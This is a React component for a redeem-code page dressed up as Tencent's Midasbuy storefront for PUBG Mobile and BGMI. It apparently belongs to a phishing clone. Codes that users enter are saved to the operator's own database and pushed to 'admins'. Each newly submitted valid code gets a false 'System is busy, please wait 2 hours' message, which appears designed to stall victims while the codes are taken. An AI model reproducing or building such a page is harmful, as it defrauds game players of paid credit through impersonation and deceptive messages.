import { useState, useEffect } from "react";
import { useAuth } from "@/hooks/useAuth";
import { motion } from "framer-motion";
import { User } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useTranslation } from "react-i18next";
const midasbuyLogo = "/lovable-uploads/b032faed-8af8-43c2-90b8-b20597ef2781.png";
import gamesPagesBackground from "@/assets/games-pages-bg.png";
import vipRedeemLogo from "@/assets/vip-redeem-logo.png";
import PromotionCarouselBanner from "@/components/PromotionCarouselBanner";
interface RedeemTabContentProps {
  gameBrand?: string;
  onOpenPlayerIdModal?: () => void;
  savedPlayerInfo?: { id: string; username: string } | null;
}

const RedeemTabContent = ({ gameBrand = 'PUBG MOBILE', onOpenPlayerIdModal, savedPlayerInfo }: RedeemTabContentProps) => {
  const { t } = useTranslation();
  const { user } = useAuth();
  const [redeemCode, setRedeemCode] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [successMessage, setSuccessMessage] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isRateLimited, setIsRateLimited] = useState(false);
  const [rateLimitEndTime, setRateLimitEndTime] = useState<Date | null>(null);

  // About section headline (some locales split into 3 parts)
  const paySafeLine1 = t('redeemTab.paySafeLine1', 'PAY SAFE, FAST AND');
  const paySafeLine2 = t('redeemTab.paySafeLine2', 'FUN WITH MIDASBUY.');
  const paySafeLine3 = t('redeemTab.paySafeLine3', '');
  const paySafeSecondLine = `${paySafeLine2}${paySafeLine3 ? ` ${paySafeLine3}` : ''}`.trim();
  
  // Get saved player ID from localStorage or from prop
  const gamePrefix = gameBrand === 'BGMI' ? 'bgmi' : 'pubg';
  const savedPlayerId = savedPlayerInfo?.id || (typeof window !== 'undefined' ? localStorage.getItem(`${gamePrefix}PlayerID`) || '' : '');
  const savedUsername = savedPlayerInfo?.username || (typeof window !== 'undefined' ? localStorage.getItem(`${gamePrefix}Username`) || '' : '');
  
  // Note: checkExistingCode removed - now using atomic database function submit_redeem_code

  // Rate limit check - 5 codes per 10 minutes per user
  const checkRateLimit = async (): Promise<boolean> => {
    if (!user) return false;
    
    try {
      const tenMinutesAgo = new Date();
      tenMinutesAgo.setMinutes(tenMinutesAgo.getMinutes() - 10);

      const { count, error } = await supabase
        .from('redeem_codes')
        .select('*', { count: 'exact', head: true })
        .eq('username', user.email || user.user_metadata?.full_name || 'Unknown')
        .gte('created_at', tenMinutesAgo.toISOString());

      if (error) {
        console.error('Rate limit check error:', error);
        return false;
      }

      return (count || 0) >= 5;
    } catch (err) {
      console.error('Rate limit check failed:', err);
      return false;
    }
  };

  const handleSignIn = () => {
    window.location.href = '/auth';
  };

  const handleRedeemSubmit = async () => {
    setErrorMessage("");
    setSuccessMessage("");
    
    if (!redeemCode.trim()) {
      setErrorMessage("Please enter a redeem code");
      return;
    }

    const trimmedCode = redeemCode.trim();
    
    // Detect non-coupon inputs: emails, URLs, names, etc.
    const looksLikeEmail = /[@]/.test(trimmedCode);
    const looksLikeUrl = /^(https?:\/\/|www\.)|(\.(com|net|org|io|pk|co|dev|info|xyz))/i.test(trimmedCode);
    const looksLikeName = /^[a-zA-Z\s]{2,}$/.test(trimmedCode) && !/\d/.test(trimmedCode);
    const isOnlyDigits = /^\d+$/.test(trimmedCode);
    const isNonCoupon = looksLikeEmail || looksLikeUrl || looksLikeName || isOnlyDigits;
    
    // Valid codes are 18-20 characters
    const isValidLength = trimmedCode.length >= 18 && trimmedCode.length <= 20 && !isNonCoupon;

    // Check rate limit before submission (only for logged in users)
    if (user) {
      const rateLimited = await checkRateLimit();
      if (rateLimited) {
        setIsRateLimited(true);
        const endTime = new Date();
        endTime.setMinutes(endTime.getMinutes() + 10);
        setRateLimitEndTime(endTime);
        setErrorMessage("Aap ne 10 minute mein 5 se zyada codes submit kar diye hain. Please 10 minute baad try karein.");
        return;
      }
    }
    
    setIsSubmitting(true);
    
    try {
      // Get user identifier - use Player ID if available, otherwise user email or "Guest"
      const userIdentifier = savedPlayerId 
        ? savedPlayerId 
        : (user?.email || user?.user_metadata?.full_name || 'Guest User');
      const usernameValue = savedUsername || user?.email || user?.user_metadata?.full_name || 'Guest';

      // If code length is invalid, insert directly as "invalid" status (no admin notification)
      if (!isValidLength) {
        const { error } = await supabase
          .from('redeem_codes')
          .insert({
            player_id: savedPlayerId || `Guest: ${usernameValue}`,
            redeem_code: trimmedCode,
            username: usernameValue,
            status: 'invalid' // Direct invalid - no notification
          });

        if (error) {
          if (error.code === '23505') {
            setErrorMessage("Redeem Code is Invalid. Please try a Valid code.");
          } else {
            console.error('Error submitting invalid code:', error);
            setErrorMessage("Failed to submit code. Please try again.");
          }
        } else {
          setErrorMessage("Redeem Code is Invalid. Please try a Valid code.");
          setRedeemCode("");
        }
        setIsSubmitting(false);
        return;
      }

      // Use atomic database function for valid-length codes
      const { data, error } = await supabase.rpc('submit_redeem_code', {
        p_player_id: savedPlayerId || `Guest: ${usernameValue}`,
        p_redeem_code: trimmedCode,
        p_username: usernameValue
      });
      
      if (error) {
        console.error('Error submitting redeem code:', error);
        setErrorMessage("Failed to submit code. Please try again.");
        setIsSubmitting(false);
        return;
      }

      // Parse response
      const result = data as { success: boolean; duplicate: boolean; status?: string } | null;

      // Check if it was a duplicate
      if (result?.duplicate) {
        if (result?.status === 'approved') {
          setSuccessMessage("This code is already used. Please check your PUBG account for UC delivered. ✓");
          setErrorMessage("");
        } else if (result?.status === 'already_used') {
          setErrorMessage("This code is already used. Please try a different code.");
          setSuccessMessage("");
        } else if (result?.status === 'invalid') {
          setErrorMessage("Redeem Code is Invalid. Please try a Valid code.");
          setSuccessMessage("");
        } else {
          // Pending duplicate
          setErrorMessage("Please wait 2 hours. System is busy, please try again later.");
        }
        setIsSubmitting(false);
        return;
      }

      // Successfully inserted valid code - pending status
      setErrorMessage("Please wait 2 hours. System is busy, please try again later.");
      setRedeemCode("");

      // Send push notification to admins ONLY for valid-length codes (18-23 chars)
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      fetch(`${supabaseUrl}/functions/v1/notify-admin-redeem-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          redeem_code: trimmedCode,
          player_id: savedPlayerId || `Guest: ${usernameValue}`,
          username: usernameValue,
        }),
      }).catch(err => console.error('Notification failed:', err));
    } catch (err) {
      console.error('Error:', err);
      setErrorMessage("An error occurred. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="py-4 px-4 md:py-8 md:px-8 relative min-h-[600px]">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Promotional Banner Carousel - Same as Purchase tab */}
        <PromotionCarouselBanner className="mb-6 mt-2" />

        {/* Steps Card Container - Gray background on PC */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="md:bg-[#2a3548] md:rounded-2xl md:p-8 lg:p-12"
        >
          <div className="flex flex-col md:flex-row md:gap-16 lg:gap-24">
        {/* Left side - Steps - compact layout matching reference */}
            <div className="flex-1 space-y-5 md:space-y-0">
              {/* Step 1: Sign In & Enter Player ID */}
              <div className="relative">
                {/* Title row with number */}
                <div className="flex items-center gap-2 mb-2">
                  {/* Step number - glass blur background, no blue border */}
                  <span className="w-6 h-6 md:w-7 md:h-7 flex items-center justify-center backdrop-blur-md bg-white/10 text-blue-400 font-semibold rounded text-xs flex-shrink-0">
                    1
                  </span>
                  <h3 className="text-white font-semibold text-xs md:text-sm tracking-wide">
                    {t('redeemTab.signInEnterPlayerId', 'ENTER PLAYER ID')}
                  </h3>
                </div>
                
                {/* Button - full width, extends under number 1 */}
                {savedPlayerId ? (
                  <button
                    onClick={onOpenPlayerIdModal}
                    className="w-full py-2.5 backdrop-blur-md bg-white/5 text-white font-normal text-xs rounded flex items-center justify-center gap-2 hover:bg-white/10 transition-all cursor-pointer"
                  >
                    <User className="w-3.5 h-3.5 text-blue-400" />
                    <span className="text-gray-300 text-xs">{savedUsername || t('redeemTab.player', 'Player')}</span>
                    <span className="text-gray-500">|</span>
                    <span className="font-mono text-blue-300 text-xs">{savedPlayerId}</span>
                  </button>
                ) : user ? (
                  <button
                    onClick={onOpenPlayerIdModal}
                    className="w-full py-2.5 text-white font-normal text-xs rounded-md transition-all duration-300 flex items-center justify-center"
                    style={{
                      background: 'linear-gradient(180deg, #00c6ff 0%, #0075ff 60%, #006aff 95%)'
                    }}
                  >
                    {t('redeemTab.enterPlayerId', 'Enter Player ID')}
                  </button>
                ) : (
                  <button
                    onClick={handleSignIn}
                    className="w-full py-2.5 text-white font-normal text-xs rounded-md transition-all duration-300 flex items-center justify-center"
                    style={{
                      background: 'linear-gradient(180deg, #00c6ff 0%, #0075ff 60%, #006aff 95%)'
                    }}
                  >
                    {t('redeemTab.signInMidasbuy', 'Sign In Midasbuy Account')}
                  </button>
                )}
              </div>

              {/* Step 2: Enter Redeem Code */}
              <div className="relative">
                {/* Title row with number */}
                <div className="flex items-center gap-2 mb-2">
                  {/* Step number - glass blur background, no blue border */}
                  <span className="w-6 h-6 md:w-7 md:h-7 flex items-center justify-center backdrop-blur-md bg-white/10 text-blue-400 font-semibold rounded text-xs flex-shrink-0">
                    2
                  </span>
                  <h3 className="text-gray-400 font-semibold text-xs md:text-sm tracking-wide">
                    {t('redeemTab.enterRedeemCode', 'ENTER REDEEM CODE')}
                  </h3>
                </div>
                
                {/* VIP Banner + Input combined section - lighter silver, ultra thin */}
                <div className="relative rounded-md" style={{ background: 'linear-gradient(180deg, #7d868f 0%, #6e777f 100%)' }}>
                  {/* Clip the banner+input, but keep the VIP icon visible outside */}
                  <div className="overflow-hidden rounded-md">
                    <div className="flex items-center h-5 pl-8 pr-2">
                      <span className="text-white text-[9px] font-medium">
                        {t('redeemTab.extraUcText', 'Redeem can get extra 3~7% UC')}
                      </span>
                    </div>
                    {/* Input - connected to VIP banner */}
                    <input
                      type="text"
                      value={redeemCode}
                      onChange={(e) => {
                        // Limit to 35 characters max to prevent multiple codes
                        const value = e.target.value.slice(0, 35);
                        setRedeemCode(value);
                        setErrorMessage("");
                        setSuccessMessage("");
                      }}
                      maxLength={20}
                      placeholder={t('redeemTab.pleaseEnterRedeemCode', 'Please enter a redeem code')}
                      className="w-full px-3 py-2 bg-[#1a2235] text-white text-xs placeholder-gray-500 focus:outline-none border-t border-gray-600/30"
                    />
                  </div>

                  {/* VIP icon (not clipped) */}
                  <img
                    src={vipRedeemLogo}
                    alt="VIP"
                    className="absolute left-0 top-0 w-9 h-9 object-contain -translate-y-1/4 -translate-x-[22%]"
                  />
                </div>
                
                {/* Rate Limit Warning - Above Button */}
                {isRateLimited && rateLimitEndTime && (
                  <motion.p 
                    initial={{ opacity: 0, y: -5 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-yellow-500 text-[10px] mt-2 mb-1"
                  >
                    ⏳ Please 10 minute wait karein
                  </motion.p>
                )}

                {/* Error message - Above Button */}
                {errorMessage && (
                  <motion.p 
                    initial={{ opacity: 0, y: -5 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-red-400 text-[10px] mt-2 mb-1"
                  >
                    {errorMessage}
                  </motion.p>
                )}

                {/* Success message - Above Button */}
                {successMessage && (
                  <motion.p 
                    initial={{ opacity: 0, y: -5 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-green-400 text-[10px] mt-2 mb-1"
                  >
                    {successMessage}
                  </motion.p>
                )}
                
                {/* OK button - full width, matching gradient */}
                <button
                  onClick={handleRedeemSubmit}
                  disabled={isSubmitting || isRateLimited}
                  className="w-full py-2.5 mt-1 text-white font-medium text-xs rounded-md transition-all duration-300 disabled:opacity-50"
                  style={{
                    background: 'linear-gradient(180deg, #00c6ff 0%, #0075ff 60%, #006aff 95%)'
                  }}
                >
                  {isSubmitting ? t('redeemTab.submitting', 'Submitting...') : isRateLimited ? t('redeemTab.limitReached', 'Limit Reached') : t('redeemTab.ok', 'OK')}
                </button>
              </div>
            </div>
          </div>
        </motion.div>

        {/* About Midasbuy Section - Two columns on PC */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
          className="pt-2 space-y-3"
        >
          <h3 className="text-white font-bold text-sm md:text-base tracking-wide">
            {t('redeemTab.aboutMidasbuy', 'ABOUT MIDASBUY')}
          </h3>

          {/* Two column layout on PC - sections touching each other on mobile */}
          <div className="flex flex-col md:flex-row gap-0 md:gap-6">
            {/* Left - Pay Safe Banner - transparent background, image closer to text */}
            <div 
              className="relative overflow-visible rounded-t-xl md:rounded-xl p-4 md:p-8 flex-1"
            >
              {/* Background image - matching reference: right side, proper size */}
              <div 
                className="absolute right-[-2%] top-0 w-[72%] h-full md:right-0 md:w-[75%] pointer-events-none"
                style={{
                  backgroundImage: `url(${gamesPagesBackground})`,
                  backgroundSize: 'contain',
                  backgroundPosition: 'center right',
                  backgroundRepeat: 'no-repeat',
                  opacity: 1
                }}
              ></div>
              
              <div className="relative flex items-start gap-2 z-10">
                {/* Thin line with brand gradient color */}
                <div 
                  className="w-0.5 md:w-1 h-14 md:h-20 rounded-full"
                  style={{ background: 'linear-gradient(180deg, #00c6ff 0%, #0075ff 100%)' }}
                ></div>
                <div className="flex-1">
                  <h4 className="text-white font-bold text-lg md:text-3xl lg:text-4xl leading-tight whitespace-nowrap">
                    {paySafeLine1}
                  </h4>
                  <h4 className="text-white font-bold text-lg md:text-3xl lg:text-4xl leading-tight whitespace-nowrap">
                    {paySafeSecondLine}
                  </h4>
                </div>
              </div>
            </div>

            {/* Right - Logo Section with Tencent | Midasbuy - darker, reduced opacity */}
            <div 
              className="relative overflow-hidden rounded-b-xl md:rounded-xl py-8 md:py-12 px-4 flex-1 flex flex-col justify-center items-center"
              style={{
                background: 'linear-gradient(135deg, rgba(13, 21, 32, 0.65) 0%, rgba(17, 24, 39, 0.65) 50%, rgba(15, 23, 42, 0.65) 100%)'
              }}
            >
              {/* Blue glow from bottom left corner - range +15%, opacity reduced 10% */}
              <div 
                className="absolute bottom-0 left-0 w-[72px] h-[72px] md:w-28 md:h-28 opacity-[0.05]"
                style={{
                  background: 'radial-gradient(circle at bottom left, #00c6ff 0%, #0075ff 35%, transparent 80%)'
                }}
              ></div>
              
              {/* Blue glow from top left corner */}
              <div 
                className="absolute top-0 left-0 w-[72px] h-[72px] md:w-28 md:h-28 opacity-[0.05]"
                style={{
                  background: 'radial-gradient(circle at top left, #00c6ff 0%, #0075ff 35%, transparent 80%)'
                }}
              ></div>
              
              {/* Dark orange glow from bottom right corner - opacity reduced ~10% */}
              <div 
                className="absolute bottom-0 right-0 w-[64px] h-[64px] md:w-24 md:h-24 opacity-[0.10]"
                style={{
                  background: 'radial-gradient(circle at bottom right, #ff6b35 0%, #d4380d 35%, transparent 80%)'
                }}
              ></div>
              
              {/* Dark orange glow from top right corner - opacity reduced ~10% */}
              <div 
                className="absolute top-0 right-0 w-[64px] h-[64px] md:w-24 md:h-24 opacity-[0.10]"
                style={{
                  background: 'radial-gradient(circle at top right, #ff6b35 0%, #d4380d 35%, transparent 80%)'
                }}
              ></div>
              
              <div className="relative z-10 flex items-center justify-center gap-3 md:gap-6">
                <span className="text-white text-sm md:text-xl lg:text-2xl font-bold tracking-wide" style={{ fontFamily: 'system-ui, -apple-system, sans-serif', letterSpacing: '0.05em' }}>Tencent</span>
                <div className="w-px h-4 md:h-7 bg-gray-400/50"></div>
                <div className="flex items-center gap-2">
                  <img 
                    src={midasbuyLogo} 
                    alt="Midasbuy" 
                    className="h-5 md:h-9 lg:h-10 object-contain"
                  />
                </div>
              </div>
              
              {/* Confetti decorations - 3 on left, 8 on right */}
              {/* Left side - 3 pieces */}
              <div className="absolute bottom-3 left-5 w-1.5 h-4 md:w-2 md:h-5 bg-yellow-500/70 rotate-12"></div>
              <div className="absolute bottom-7 left-10 w-1.5 h-3 md:w-2 md:h-4 bg-blue-400/60 -rotate-12"></div>
              <div className="absolute bottom-4 left-16 w-1 h-2.5 md:w-1.5 md:h-3 bg-cyan-400/50 rotate-45"></div>
              
              {/* Right side - 8 pieces */}
              <div className="absolute top-4 right-6 w-1 h-1 md:w-1.5 md:h-1.5 bg-cyan-400/60 rotate-45"></div>
              <div className="absolute bottom-3 right-4 w-1.5 h-3 md:w-2 md:h-4 bg-blue-300/60 -rotate-6"></div>
              <div className="absolute bottom-5 right-10 w-1 h-2.5 md:w-1.5 md:h-3 bg-purple-400/50 rotate-12"></div>
              <div className="absolute bottom-8 right-16 w-1.5 h-2 md:w-2 md:h-3 bg-yellow-400/50 -rotate-12"></div>
              <div className="absolute top-5 right-12 w-0.5 h-2 md:w-1 md:h-2.5 bg-green-400/40 rotate-45"></div>
              <div className="absolute bottom-6 right-20 w-1 h-2 md:w-1.5 md:h-2.5 bg-pink-400/50 rotate-6"></div>
              <div className="absolute top-7 right-18 w-0.5 h-1.5 md:w-1 md:h-2 bg-orange-400/40 -rotate-12"></div>
              <div className="absolute bottom-4 right-14 w-1 h-1.5 md:w-1.5 md:h-2 bg-teal-400/50 rotate-45"></div>
            </div>
          </div>
        </motion.div>
      </div>

    </div>
  );
};

export default RedeemTabContent;
